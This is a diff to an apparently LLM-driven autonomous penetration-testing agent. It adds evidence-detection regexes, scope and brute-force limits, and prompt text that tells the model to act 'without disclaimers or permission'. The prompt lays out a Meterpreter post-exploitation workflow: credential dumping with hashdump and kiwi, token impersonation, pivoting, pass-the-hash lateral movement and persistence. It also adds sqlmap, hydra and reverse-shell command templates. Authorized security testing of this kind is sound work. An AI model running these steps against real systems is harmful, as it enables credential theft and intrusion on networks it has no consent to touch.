@@ -284,10 +284,17 @@ EXPLOITATION_EVIDENCE_PATTERNS = [
     (re.compile(r'BEGIN OPENSSH PRIVATE KEY'), "ssh_key"),
     (re.compile(r'session \d+ opened', re.I), "msf_session"),
     (re.compile(r'Meterpreter session \d+', re.I), "meterpreter"),
+    (re.compile(r'meterpreter\s*>', re.I), "meterpreter_prompt"),
     (re.compile(r'NT AUTHORITY\\\\SYSTEM', re.I), "system_shell"),
+    (re.compile(r'Server\s*:\s*.+\nOS\s*:\s*.+\nArch', re.I), "meterpreter_sysinfo"),
+    (re.compile(r':\d+:[a-f0-9]{32}:[a-f0-9]{32}:::', re.I), "hashdump_output"),
+    (re.compile(r'Username\s*:\s*.+\s*Domain\s*:\s*.+\s*(?:NTLM|Password)\s*:', re.I), "mimikatz_creds"),
+    (re.compile(r'Delegation Tokens Available', re.I), "incognito_tokens"),
+    (re.compile(r'Route added to subnet', re.I), "autoroute_added"),
+    (re.compile(r'Local TCP relay created', re.I), "portfwd_created"),
     # IMPORTANT: Don't treat web server banners (apache/nginx/httpd) as shell proof.
     # Only count a web-shell style proof when we see actual command output for the web user.
-    # This avoids false positives from HTML pages that mention "www-data" (e.g. DVWA setup page).
+    # This avoids false positives from HTML pages that mention "www-data" (e.g. app setup pages).
     (re.compile(r'uid=\d+\(www-data\)', re.I), "web_shell"),
     (re.compile(r'CREATE TABLE|INSERT INTO|SELECT .+ FROM', re.I), "sql_output"),
     # Require an actual assignment (":" or "=") to avoid matching HTML field names/types.
@@ -493,6 +500,21 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
 - Extract maximum value before moving to next target
 
 **KILL CHAIN:** Scan → Exploit → Proof → Deepen → Lateral → Persist (if allowed).
+
+**MULTI-TARGET ENGAGEMENT:**
+1. FIRST: Run nmap -F -n --open on ALL targets and SAVE results to /pentest/output/recon-summary.txt
+2. For EACH target: append detailed nmap -sV results to recon-summary.txt
+3. BEFORE exploiting any target: cat /pentest/output/recon-summary.txt to recall correct ports
+4. Work through targets systematically: scan → find vuln → exploit → extract proof → next target
+5. Save ALL credentials, findings, and access to files — conversation memory gets trimmed!
+6. When in doubt about a port or service, re-read your saved recon files rather than guessing.
+
+**NO BRUTE-FORCE:** Do NOT run password brute-force attacks (hydra with rockyou.txt, hashcat, john with large wordlists). They take hours and waste resources. Instead:
+- Try default/common credentials ONLY: admin:admin, admin:password, root:root, test:test, guest:guest (max 20-50 attempts)
+- Use `/opt/tazosploit/wordlists/default-creds.txt` if you need a wordlist for hydra/medusa
+- If default creds fail → MOVE ON to other attack vectors (SQLi, RCE, file upload, SSRF, IDOR, auth bypass)
+- Report "Login form found, default credentials failed" as a finding
+- For directory enumeration: use `/usr/share/wordlists/dirb/common.txt` (small, fast) — NOT medium/large lists
 
 **SCOPING:** Only in-scope targets. No localhost/127.0.0.1/Docker internals. No broad subnet scans unless scope expansion enabled.
 
@@ -765,7 +787,8 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
         # Sprint 1: Resolve start phase from job config unless explicitly overridden.
         phase_gate_start = os.getenv("PHASE_GATE_START", "")
         effective_phase = os.getenv("EFFECTIVE_PHASE", "")
-        job_phase = os.getenv("JOB_PHASE", "")
+        job_phase = os.getenv("JOB_PHASE", "") or os.getenv("PHASE", "")
+        self.job_phase = job_phase.strip().upper()
         resolved_phase = None
         if PHASE_MACHINE_AVAILABLE and resolve_start_phase:
             try:
@@ -2154,7 +2177,7 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
                                 "apache", "nginx", "ubuntu", "centos", "guest", "ftp",
                                 "ssh", "git", "jenkins", "tomcat", "oracle", "sa",
                                 "nobody", "daemon", "bin", "sys", "sync", "backup",
-                                "bkimminich", "mc", "jim", "bender", "morty",
+                                # App-specific users should be discovered dynamically
                             }
                             if uname not in _known_accounts:
                                 continue
@@ -2490,7 +2513,13 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
         return None
 
     def _block_redundant_exploit(self, content: str) -> Optional[str]:
-        """Block exploit attempts for vulns already proven or marked not exploitable."""
+        """Block exploit attempts for vulns already proven or marked not exploitable.
+
+        Only blocks when ALL vulns of a given type are resolved (proven or skipped).
+        If any vuln of the type is still active/unexploited, allow the attempt so the
+        agent can continue exploiting the remaining entry.  This prevents deadlocks
+        when duplicate vuln entries exist (e.g. sql_injection_host vs sql_injection_host:port).
+        """
         if not content:
             return None
         cmd_lower = content.lower()
@@ -2506,25 +2535,31 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
         for cmd_markers, vuln_keywords in vuln_type_checks:
             if not any(m in cmd_lower for m in cmd_markers):
                 continue
+            # Collect all vulns matching this type
+            matching_vulns = []
             for vid, v in (self.vulns_found or {}).items():
                 if not isinstance(v, dict):
                     continue
                 vtype = str(v.get("type") or "").lower()
                 if not any(kw in vtype for kw in vuln_keywords):
                     continue
-                # Block if vuln has BOTH proof AND not_exploitable (contradictory → resolved)
-                # or if it's proven (exploited + proof)
-                # or if it's skipped (not_exploitable_reason set)
-                is_proven = v.get("exploited") and v.get("proof")
-                is_skipped = bool((v.get("not_exploitable_reason") or "").strip())
-                # IMPORTANT: Do NOT block post-exploit "deepening" actions after a vuln is proven.
-                # Only block vulns explicitly marked not exploitable (skip) to prevent loops.
-                if is_skipped:
-                    reason = "marked not exploitable"
-                    return (
-                        f"⚠️ {vtype.upper()} vuln at {v.get('target', '?')} is {reason}. "
-                        f"Do NOT retry this vuln type. Move to a different vulnerability or discovery."
-                    )
+                matching_vulns.append(v)
+            if not matching_vulns:
+                continue
+            # Only block if ALL matching vulns are resolved (proven or skipped).
+            # If any vuln of this type is still active, let the exploit attempt through.
+            all_resolved = all(
+                (mv.get("exploited") and mv.get("proof"))
+                or bool((mv.get("not_exploitable_reason") or "").strip())
+                for mv in matching_vulns
+            )
+            if all_resolved:
+                vtype_label = str(matching_vulns[0].get("type") or "unknown").upper()
+                return (
+                    f"⚠️ {vtype_label} vuln type is fully resolved "
+                    f"({len(matching_vulns)} entries, all proven or skipped). "
+                    f"Do NOT retry this vuln type. Move to a different vulnerability or discovery."
+                )
         return None
 
     def _parse_targets_from_text(self, text: str) -> set:
@@ -2770,7 +2805,13 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
             norm = self._normalize_target_token(self.target)
             if norm:
                 targets.add(norm)
-        targets.update(self.allowed_targets)
+        # Add both raw and normalized (bare hostname) for every allowed target.
+        # e.g. "myhost:3000" adds both "myhost:3000" AND "myhost".
+        for at in (self.allowed_targets or []):
+            targets.add(at)
+            norm_at = self._normalize_target_token(at)
+            if norm_at and norm_at != at:
+                targets.add(norm_at)
         if self.objective:
             targets.update(self._parse_targets_from_text(self.objective))
 
@@ -2781,6 +2822,10 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
         self.allowed_targets_set = {t for t in targets if t}
         if self.allowed_targets_set:
             self._log(f"Scope allowlist initialized: {sorted(self.allowed_targets_set)}")
+            # Auto-enable multi-target scanning when scope has multiple targets
+            if len(self.allowed_targets_set) > 1:
+                self.allow_multi_target_scan = True
+                self._log(f"Multi-target scan auto-enabled ({len(self.allowed_targets_set)} targets in scope)")
 
     def _extract_targets_from_command(self, content: str) -> set:
         """Extract potential target tokens from a command string."""
@@ -2842,7 +2887,7 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
                 continue
             targets.add(host)
 
-        # Allow bare hostnames from allowlist (e.g., dvwa, webgoat)
+        # Allow bare hostnames from allowlist (e.g., lab targets, internal hosts)
         allowlist = set(self.allowed_targets_set) if self.allowed_targets_set else set(self.allowed_targets)
         for token in allowlist:
             if not token:
@@ -2859,7 +2904,7 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
 
         In multi-target jobs, `self.target` may remain the initial engagement label even when
         the LLM executes commands against other in-scope targets. Using the command-derived
-        target prevents mis-attributing findings (e.g., DVWA findings being recorded as JuiceShop).
+        target prevents mis-attributing findings (e.g., target-A findings being recorded as target-B).
         """
         if not content:
             return None
@@ -2915,6 +2960,55 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
             trimmed = trimmed[:max_chars]
         return trimmed, True
 
+    # Large wordlists that should NEVER be used for brute-force (too slow for SaaS)
+    _BLOCKED_WORDLISTS = {
+        "rockyou.txt", "rockyou-75.txt", "rockyou2024.txt",
+        "directory-list-2.3-medium.txt", "directory-list-2.3-big.txt",
+        "directory-list-lowercase-2.3-medium.txt", "directory-list-lowercase-2.3-big.txt",
+        "darkweb2017-top10000.txt", "xato-net-10-million-passwords.txt",
+        "10-million-password-list-top-1000000.txt",
+    }
+
+    def _brute_force_violation(self, content: str) -> Optional[str]:
+        """Block password brute-force with large wordlists. SaaS pentests should
+        try default/common creds only, then move to other attack vectors."""
+        tool = self._detect_tool(content)
+        brute_tools = ("hydra", "medusa", "ncrack", "patator", "hashcat", "john")
+        if tool not in brute_tools:
+            return None
+        # Always block hashcat/john — hash cracking is never appropriate in SaaS
+        if tool in ("hashcat", "john"):
+            return (
+                f"⚠️ POLICY: Password hash cracking ({tool}) is not allowed — "
+                "it takes hours/days and is not suitable for automated pentesting. "
+                "Report the captured hash as a finding and move on to other attack vectors."
+            )
+        # Check for large wordlists
+        lowered = (content or "").lower()
+        match = re.search(r'(?:-P|-p|--passwords?|--wordlist|-w)\s+([^\s]+)', content)
+        if match:
+            wl_path = match.group(1).strip('\'"')
+            wl_name = os.path.basename(wl_path)
+            if wl_name in self._BLOCKED_WORDLISTS:
+                return (
+                    f"⚠️ POLICY: Large wordlist '{wl_name}' blocked — brute-force is too slow for SaaS pentesting. "
+                    "Use `/opt/tazosploit/wordlists/default-creds.txt` (top 50 default credentials) instead. "
+                    "If default creds fail, move on to other attack vectors (SQLi, RCE, auth bypass, SSRF)."
+                )
+            # Also block if the wordlist file is > 100KB (roughly > 5000 entries)
+            if os.path.exists(wl_path):
+                try:
+                    size = os.path.getsize(wl_path)
+                    if size > 100_000:  # 100KB
+                        return (
+                            f"⚠️ POLICY: Wordlist '{wl_name}' is too large ({size // 1024}KB) for credential testing. "
+                            "Use `/opt/tazosploit/wordlists/default-creds.txt` (top 50 default credentials) instead. "
+                            "If default creds fail, move on to other attack vectors."
+                        )
+                except OSError:
+                    pass
+        return None
+
     def _wordlist_violation(self, content: str) -> Optional[str]:
         """Preflight wordlist paths for common enumeration tools."""
         import re
@@ -2922,6 +3016,15 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
         tool = self._detect_tool(content)
         if tool not in ("gobuster", "ffuf", "wfuzz", "dirb", "dirsearch", "feroxbuster"):
             return None
+        # Block large directory wordlists too
+        match_dir = re.search(r'(?:-w|--wordlist)\s+([^\s]+)', content)
+        if match_dir:
+            wl_name = os.path.basename(match_dir.group(1).strip('\'"'))
+            if wl_name in self._BLOCKED_WORDLISTS:
+                return (
+                    f"⚠️ POLICY: Large wordlist '{wl_name}' blocked — too slow for SaaS pentesting. "
+                    "Use `/usr/share/wordlists/dirb/common.txt` (~4.7k entries, finishes in <30 seconds)."
+                )
         match = re.search(r'(?:-w|--wordlist)\s+([^\s]+)', content)
         if not match:
             return None
@@ -3083,13 +3186,21 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
                     self.recon_baseline_complete = True
 
     def _update_knowledge_graph(self, tool_name: str, command: str, execution: Execution) -> None:
-        """Sprint 2: Best-effort update of the knowledge graph from one execution."""
+        """Best-effort update of the knowledge graph from one execution.
+
+        Delegates parsing to graph_parsers.auto_parse which creates:
+        Target, Port, Service, Technology, Vulnerability, CVE,
+        Endpoint, Credential, and MitreTechnique nodes.
+        """
 
         kg = getattr(self, "kg", None)
         if not kg or not getattr(kg, "available", False):
             return
 
-        # 1) Parse scanner output into graph nodes (hosts/services/vulns).
+        # 1) Parse tool output → graph nodes and relationships.
+        #    auto_parse handles: nmap, nikto, whatweb, gobuster, ffuf, dirb,
+        #    sqlmap, hydra, wpscan, nuclei, metasploit, enum4linux, etc.
+        #    It also runs generic credential/CVE extraction and MITRE tagging.
         try:
             if kg_auto_parse:
                 blob = (execution.stdout or execution.stderr or "")
@@ -3098,7 +3209,7 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
         except Exception:
             pass
 
-        # 2) Record exploit attempts (only when we are actively exploiting).
+        # 2) Record exploit attempts (only when actively exploiting).
         try:
             if not self._exploit_phase_active():
                 return
@@ -3147,13 +3258,16 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
             except Exception:
                 cve = None
 
+            # Collect MITRE techniques from execution metadata
+            mitre_techs = list(getattr(execution, "mitre_techniques", None) or [])
+
             evidence = (execution.stdout or execution.stderr or "")[:2000]
             try:
-                kg.add_host(ip=host)
+                kg.add_target(ip=host)
             except Exception:
                 pass
             try:
-                kg.record_exploit_attempt(
+                kg.add_exploit(
                     host_ip=host,
                     port=int(port or 0),
                     tool=str(tool_name or "").strip().lower(),
@@ -3161,6 +3275,7 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
                     success=bool(execution.success),
                     evidence=evidence,
                     cve=cve,
+                    mitre_techniques=mitre_techs,
                 )
             except Exception:
                 pass
@@ -3210,6 +3325,10 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
     def _recon_status_hint(self) -> str:
         """Spec 007: Return a context hint about recon completeness."""
         if self.recon_phase_complete:
+            # Multi-target: don't block recon on other targets
+            target_count = len(self.allowed_targets_set) if self.allowed_targets_set else len(self.allowed_targets)
+            if target_count > 1:
+                return "⚡ Initial recon complete for primary target. Continue scanning other in-scope targets while exploiting known vulnerabilities."
             return "⚡ RECON COMPLETE — Focus on EXPLOITATION. Don't re-run nmap/gobuster/whatweb."
         completed = sum(1 for v in self.recon_checklist.values() if v)
         if completed == 0:
@@ -3476,6 +3595,8 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
                     "- Multi-target engagement: rotate across in-scope targets. For EACH target: baseline recon → find 1 high-confidence vuln → exploit with PROOF → "
                     "perform 2 post-exploit deepening actions (data dump / secrets read / credential validation) → then pivot."
                 )
+        lines.append("- NO BRUTE-FORCE: Do not use large wordlists (rockyou.txt, etc.) for credential attacks. "
+                     "Try default creds only (`/opt/tazosploit/wordlists/default-creds.txt`). If they fail, move to other attack vectors.")
         lines.append(f"- Scope expansion: {'allowed' if self.allow_scope_expansion else 'disabled'}")
         lines.append(f"- Persistence actions: {'allowed' if self.allow_persistence else 'disabled'}")
         lines.append(f"- Defense evasion/cleanup: {'allowed' if self.allow_defense_evasion else 'disabled'}")
@@ -3504,6 +3625,14 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
             lines.append("- When confirming a vulnerability, include MITRE ID in memory tags, e.g. [REMEMBER: vulnerability_found] SQLi (T1190) at /login")
         if phase in ("POST_EXPLOIT", "LATERAL", "FULL"):
             lines.append("- REQUIRED: perform post-exploitation tasks (priv-esc checks, container checks, evidence collection, lateral movement). If persistence is allowed, attempt it.")
+            lines.append("- METASPLOIT POST-EXPLOIT WORKFLOW (when Meterpreter session available):")
+            lines.append("  1. Enumerate: sysinfo → getuid → getprivs → ipconfig → ps")
+            lines.append("  2. Privilege Escalation: getsystem → if fails, run post/multi/recon/local_exploit_suggester → try UAC bypasses or Potato exploits")
+            lines.append("  3. Credential Harvesting: hashdump → load kiwi → creds_all → creds_wdigest → check for cleartext")
+            lines.append("  4. Token Theft: load incognito → list_tokens -u → impersonate_token for higher-priv users")
+            lines.append("  5. Pivoting (if multi-subnet): run autoroute -s <subnet>/24 → start socks_proxy → portfwd for specific services")
+            lines.append("  6. Lateral Movement: use exploit/windows/smb/psexec with harvested hashes (Pass-the-Hash) or creds")
+            lines.append("  7. Persistence (if allowed): registry run keys, scheduled tasks, services, SSH keys, cron jobs")
         if self.enable_session_handoff:
             lines.append("- When you gain shell or privileged access, write /pentest/output/<job>/handoff.json with an interactive command.")
         # C2 deployment policy
@@ -3529,8 +3658,13 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
             "msfvenom",
             "msfdb",
             "msfrpc",
+            "msfrpcd",
             "msfupdate",
             "msf6",
+            "use exploit/",
+            "use auxiliary/",
+            "use post/",
+            "use payload/",
         ]
         return any(ind in cmd for ind in indicators)
 
@@ -3936,7 +4070,7 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
         target_variants = {t for t in (target_host, self.target) if t}
         allowed = set(self.allowed_targets_set) if self.allowed_targets_set else set(self.allowed_targets)
         allowed.update(target_variants)
-        # Treat known aliases as in-scope (e.g., juiceshop <-> 172.21.0.x).
+        # Treat known aliases as in-scope (e.g., hostname <-> resolved IP).
         try:
             if getattr(self, "target_aliases", None):
                 allowed.update(self.target_aliases.keys())
@@ -3993,7 +4127,7 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
 
         # Block any direct IP/hostname access that isn't in the allowlist
         command_targets = self._extract_targets_from_command(content)
-        # Normalize extracted targets and collapse aliases so `juiceshop` + its IP doesn't look like 2 targets.
+        # Normalize extracted targets and collapse aliases so a hostname + its IP doesn't look like 2 targets.
         try:
             norm_targets = set()
             for t in (command_targets or set()):
@@ -4841,7 +4975,7 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
             except Exception:
                 pass
             # If we can't attribute these IPs to an in-scope command target, do not alias.
-            # Example: `host z.ai` should never map z.ai's public IPs → "juiceshop".
+            # Example: `host z.ai` should never map z.ai's public IPs → the lab target.
             if not canonical:
                 return
             for ip in found_ips:
@@ -4868,9 +5002,9 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
         if "curl " in cmd_lower or (execution.tool_used or "").lower() == "curl":
             out = self._strip_curl_progress(out)
         out_lower = out.lower()
-        # Many SPAs (including JuiceShop) return an HTML index page for unknown paths with HTTP 200.
+        # Many SPAs return an HTML index page for unknown paths with HTTP 200.
         # Treat HTML-ish responses as weak evidence for file disclosure unless we have strong markers.
-        html_like = any(tok in out_lower for tok in ("<!doctype", "<html", "<head", "<body", "<title>owasp juice shop"))
+        html_like = any(tok in out_lower for tok in ("<!doctype", "<html", "<head", "<body"))
         if not execution.success:
             self._maybe_register_target_aliases_from_output(cmd_lower, out)
             return
@@ -4973,7 +5107,7 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
         # Information disclosure: exposed backup/secret-ish files under known static areas (e.g., /ftp/*.bak)
         if "curl " in cmd_lower and execution.success:
             # Avoid SPA "index.html for everything" false positives.
-            if any(tok in out_lower for tok in ("<!doctype", "<html", "<head", "<body", "<title>owasp juice shop")):
+            if any(tok in out_lower for tok in ("<!doctype", "<html", "<head", "<body")):
                 self._maybe_register_target_aliases_from_output(cmd_lower, out)
                 return
 
@@ -5824,7 +5958,7 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
             if not execution.success:
                 return
 
-            # Command injection proof (DVWA-style) — if we see uid= and the exec endpoint is involved,
+            # Command injection proof — if we see uid= and an exec/command endpoint is involved,
             # auto-track and mark proven even if the vuln wasn't explicitly tracked yet.
             try:
                 if "/vulnerabilities/exec" in cmd_lower and re.search(r"\\buid=\\d+\\b", out_lower):
@@ -5841,7 +5975,7 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
             except Exception:
                 pass
 
-            # SQL injection proof (DVWA-style) — key off the /vulnerabilities/sqli endpoint.
+            # SQL injection proof — key off common vuln-testing endpoints (e.g. /vulnerabilities/sqli).
             # Require at least one clear record marker (First name/Surname) or a leaked hash.
             try:
                 if "/vulnerabilities/sqli" in cmd_lower:
@@ -6030,7 +6164,7 @@ This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission
             
             # Add relevant memories from previous sessions
             # IMPORTANT: Filter out memories referencing out-of-scope targets to prevent
-            # the agent from attacking wrong hosts (e.g., DVWA at 172.21.0.2 from prior runs)
+            # the agent from attacking wrong hosts (e.g., a prior target's IP from old runs)
             if self.memory_store:
                 memory_context = create_memory_prompt_section(
                     self.memory_store, 
@@ -6086,10 +6220,14 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
             
             self.conversation.append({"role": "user", "content": initial_prompt})
         
-        while self.iteration < self.max_iterations:
+        # max_iterations semantics:
+        # - >0: hard iteration cap
+        # - <=0: unlimited (still bounded by timeout_seconds enforced by the worker)
+        while (int(getattr(self, "max_iterations", 0) or 0) <= 0) or (self.iteration < self.max_iterations):
             self.iteration += 1
             self._gate_message_count_in_context = 0  # Reset gate message counter each iteration
-            self._log(f"=== Iteration {self.iteration}/{self.max_iterations} ===")
+            total_label = str(self.max_iterations) if int(getattr(self, "max_iterations", 0) or 0) > 0 else "unlimited"
+            self._log(f"=== Iteration {self.iteration}/{total_label} ===")
             if self.hard_stop_reason:
                 self._log(f"Hard stop engaged: {self.hard_stop_reason}", "ERROR")
                 break
@@ -6303,8 +6441,8 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
 
             # Context pack: keep long runs bounded without forgetting (Spec 008: summarize-before-trim)
             try:
-                max_messages = int(os.getenv("MAX_CONTEXT_MESSAGES", "60"))
-                max_context_chars = int(os.getenv("MAX_CONTEXT_CHARS", "30000"))
+                max_messages = int(os.getenv("MAX_CONTEXT_MESSAGES", "100"))
+                max_context_chars = int(os.getenv("MAX_CONTEXT_CHARS", "80000"))
                 if len(self.conversation) > max_messages:
                     system_msg = self.conversation[0] if self.conversation and self.conversation[0]["role"] == "system" else None
                     recent = self.conversation[-14:]
@@ -6392,7 +6530,10 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                             trimmed.append({"role": "user", "content": f"**CONTEXT PACK (auto)**\n{memory_context}"})
 
                     trimmed.extend(recent)
+                    old_conv = self.conversation
                     self.conversation = trimmed
+                    del old_conv  # Release old conversation memory
+                    import gc; gc.collect()
                     self._log(f"Context pack applied. Messages trimmed to {len(self.conversation)}.")
 
                 # Safety: enforce hard character cap
@@ -6420,6 +6561,10 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                         self.conversation = [self.conversation[i] for i in sorted(kept_indices)]
                         total_chars -= removed_chars
                     self._log(f"Context chars trimmed to {total_chars}.")
+
+                # Force garbage collection after trimming to prevent OOM
+                import gc
+                gc.collect()
             except Exception:
                 pass
 
@@ -6859,7 +7004,7 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                 self.last_pivot_iteration = self.iteration
                 continue
             
-            if is_stalling and self.iteration < self.max_iterations - 10:
+            if is_stalling and (self.max_iterations <= 0 or self.iteration < self.max_iterations - 10):
                 # If there are tracked vulns still needing proof, force exploitation with proof.
                 pending = self._get_unproven_vulns() if self.enforce_exploit_proof else self._get_unattempted_vulns()
                 if pending:
@@ -6971,6 +7116,13 @@ Run post-exploit actions now:
 1. Privilege checks: `id`, `whoami`, `sudo -l`, `getcap -r / 2>/dev/null`, `find / -perm -4000 -type f 2>/dev/null`
 2. Container checks: `cat /proc/1/cgroup`, `mount`, `ls -la /`, `cat /etc/os-release`
 3. Data access: read configs, env secrets, and dump application databases
+4. If you have a Meterpreter session:
+   - `sysinfo` → `getuid` → `getprivs`
+   - `getsystem` (or `run post/multi/recon/local_exploit_suggester`)
+   - `hashdump` → `load kiwi` → `creds_all`
+   - `load incognito` → `list_tokens -u` → impersonate high-priv tokens
+   - `run autoroute -s <internal_subnet>/24` (if additional subnets visible)
+   - `portfwd add -l <port> -p <port> -r <target>` (for specific services)
 
 Provide the next commands in bash blocks."""
                         })
@@ -6987,7 +7139,7 @@ Provide the next commands in bash blocks."""
                         continue
                     
                     # AI says done - but we want ALL steps including lateral movement
-                    if self.iteration < self.max_iterations - 5:
+                    if self.max_iterations <= 0 or self.iteration < self.max_iterations - 5:
                         self.conversation.append({
                             "role": "user",
                             "content": """Good progress, but we need to continue deeper. Now:
@@ -7031,6 +7183,13 @@ Continue the assessment - provide the next commands."""
                 if structure_warning:
                     self._log(f"BLOCKED command structure violation: {content[:80]}", "WARN")
                     all_feedback.append(structure_warning)
+                    continue
+
+                # Brute-force policy — block large wordlists and hash cracking
+                brute_warning = self._brute_force_violation(content)
+                if brute_warning:
+                    self._log(f"BLOCKED brute-force: {content[:80]}", "WARN")
+                    all_feedback.append(brute_warning)
                     continue
 
                 # Wordlist preflight for enumeration tools
@@ -7460,7 +7619,7 @@ Continue the assessment - provide the next commands."""
             templates = [
                 f"searchsploit -w \"$(curl -sI {base_url} | grep -i 'x-powered-by\\|server:' | head -1)\"",
                 f"msfconsole -q -x 'search type:exploit {t}; exit -y'",
-                f"curl -s -X POST {base_url}/rest/user/login -H 'Content-Type: application/json' -d '{{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}}' | head -50",
+                f"curl -s -X POST {base_url}/login -H 'Content-Type: application/json' -d '{{\"username\":\"admin\",\"password\":\"admin\"}}' | head -50",
                 f"nikto -h {base_url} -Tuning x -maxtime 60",
             ]
         return templates
@@ -7474,12 +7633,38 @@ Continue the assessment - provide the next commands."""
             self._log(f"TARGET ALIAS: {alias_norm} → {canonical_norm}", "INFO")
 
     def _check_post_exploit_depth(self) -> bool:
-        """Check if we have meaningful post-exploitation actions recorded."""
+        """Check if we have meaningful post-exploitation actions recorded.
+        
+        Covers both manual enumeration commands and Metasploit/Meterpreter
+        post-exploitation modules and commands.
+        """
         post_exploit_keywords = [
+            # Linux enumeration
             'sudo -l', 'getcap', 'capsh', 'find / -perm -4000',
             '/etc/sudoers', '/etc/shadow', '/etc/passwd', 'id ', 'whoami',
             'mount', '/proc/1/cgroup', 'docker.sock', '/run/secrets',
             'netstat', 'ss -tulpn', 'ps aux', 'crontab', 'authorized_keys',
+            # Meterpreter core enumeration
+            'sysinfo', 'getuid', 'getprivs', 'getsid', 'ipconfig',
+            # Metasploit credential harvesting
+            'hashdump', 'smart_hashdump', 'cachedump', 'lsa_secrets',
+            'load kiwi', 'creds_all', 'creds_msv', 'creds_wdigest',
+            'creds_kerberos', 'sekurlsa::logonpasswords', 'lsadump::sam',
+            'lsadump::secrets', 'lsadump::dcsync', 'lsadump::cache',
+            'credential_collector', 'windows_autologin',
+            # Metasploit privilege escalation
+            'getsystem', 'local_exploit_suggester', 'bypassuac',
+            # Metasploit token manipulation
+            'load incognito', 'list_tokens', 'impersonate_token', 'steal_token',
+            # Metasploit pivoting
+            'autoroute', 'portfwd', 'socks_proxy',
+            # Metasploit lateral movement
+            'psexec', 'wmiexec', 'winrm',
+            # Metasploit persistence
+            'persistence_exe', 'persistence_service', 'schtasks_exec',
+            'sshkey_persistence', 'enable_rdp',
+            # Meterpreter session management
+            'sessions -u', 'migrate', 'shell_to_meterpreter',
         ]
         for exec in self.executions:
             output = f"{exec.content} {exec.stdout} {exec.stderr}".lower()
@@ -7493,7 +7678,11 @@ Continue the assessment - provide the next commands."""
             return True
         persistence_keywords = [
             'crontab', '/etc/cron', 'authorized_keys', 'systemctl enable',
-            'rc.local', 'init.d', 'webshell', 'useradd', 'adduser'
+            'rc.local', 'init.d', 'webshell', 'useradd', 'adduser',
+            # Metasploit persistence modules
+            'persistence_exe', 'persistence_service', 'registry_persistence',
+            'schtasks_exec', 'sshkey_persistence', 'enable_rdp',
+            'schtasks /create', 'sc create', 'reg add',
         ]
         for exec in self.executions:
             output = f"{exec.content} {exec.stdout} {exec.stderr}".lower()
@@ -7715,7 +7904,7 @@ Continue the assessment - provide the next commands."""
             return True
         if "bearer " in text or "authorization:" in text or "jwt" in text:
             return True
-        # Generic web-session setup (DVWA-style, classic forms)
+        # Generic web-session setup (classic forms, cookies, tokens)
         if any(tok in text for tok in ("login", "user_token", "phpsessid", "cookies.txt", "--cookie", " -b ", " -c ")):
             return True
 
@@ -7970,8 +8159,10 @@ Continue the assessment - provide the next commands."""
         if not isinstance(mapping, dict):
             mapping = DEFAULT_TOOL_PHASE_MAP if isinstance(DEFAULT_TOOL_PHASE_MAP, dict) else {}
 
+        # Pass job_phase so FULL jobs bypass the tool phase gate entirely
+        job_phase = str(os.getenv("PHASE", "") or getattr(self, "job_phase", "") or "").strip().upper()
         try:
-            if is_tool_allowed(tool, phase, mapping):
+            if is_tool_allowed(tool, phase, mapping, job_phase=job_phase):
                 return None
             return get_blocked_reason(tool, phase, mapping)
         except Exception:
@@ -8020,15 +8211,6 @@ Continue the assessment - provide the next commands."""
             pass
 
         if "sql injection" in vt or "sqli" in vt:
-            ul = url.lower()
-            # Juice Shop login SQLi is typically JSON POST.
-            if "rest/user/login" in ul:
-                return (
-                    f'sqlmap -u "{url}" '
-                    f'--headers="Content-Type: application/json" '
-                    f'--data=\'{{"email":"*","password":"*"}}\' '
-                    f'--batch --dbs --risk=3 --level=5'
-                )
             return f'sqlmap -u "{url}" --batch --dbs --risk=3 --level=5'
         elif "command injection" in vt or "cmdi" in vt or "os command" in vt:
             listener_host = os.getenv("REVERSE_SHELL_HOST", "127.0.0.1")
@@ -8061,7 +8243,7 @@ Continue the assessment - provide the next commands."""
             return f'wget -r --no-passive ftp://anonymous:anonymous@{host}/ -P /tmp/ftp_dump/ 2>&1 | head -50'
         elif "ssh" in vt:
             host = tgt.split(":")[0]
-            return f'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{host} -t 4 -f'
+            return f'hydra -l root -P /opt/tazosploit/wordlists/default-creds.txt ssh://{host} -t 4 -f'
         elif "information disclosure" in vt or "sensitive data" in vt:
             return f'curl -s "{url}" -o /tmp/evidence_disclosure.txt && head -100 /tmp/evidence_disclosure.txt'
         return None
@@ -8759,18 +8941,7 @@ Continue the assessment - provide the next commands."""
         is_cred = any(marker in vtype for marker in ("credential", "creds", "default credential", "weak credential", "password"))
 
         if is_sqli:
-            ul = (vuln_url or "").lower()
-            if "rest/user/login" in ul:
